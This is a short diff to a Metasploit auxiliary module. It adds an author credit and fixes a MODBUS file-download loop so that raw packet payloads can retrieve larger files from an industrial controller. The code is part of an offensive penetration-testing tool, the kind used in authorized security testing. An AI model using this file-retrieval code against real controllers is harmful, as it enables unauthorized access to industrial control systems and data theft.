@@ -32,6 +32,7 @@ class Metasploit3 < Msf::Auxiliary
       },
       'Author'         =>
         [
+          'Arnaud Soullie <arnaud.soullie[at]solucom.fr>', # fix module, add info gathering, refactor
           'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
           'todb' # Metasploit fixups
         ],
@@ -282,11 +283,17 @@ class Metasploit3 < Msf::Auxiliary
     response = sendframe(makeframe(payload))
     print_status("#{rhost}:#{rport} - MODBUS - Retrieving file")
     block = 1
+    block2 = 0
     filedata = ""
     finished = false
     while !finished
+      if block == 256
+        block = 0
+        block2 += 1
+      end
       payload = "\x00\x5a\x01\x34\x00\x01"
       payload += [block].pack("c")
+      payload += [block2].pack("c")
       payload += "\x00"
       response = sendframe(makeframe(payload))
       filedata += response[0xe..-1]
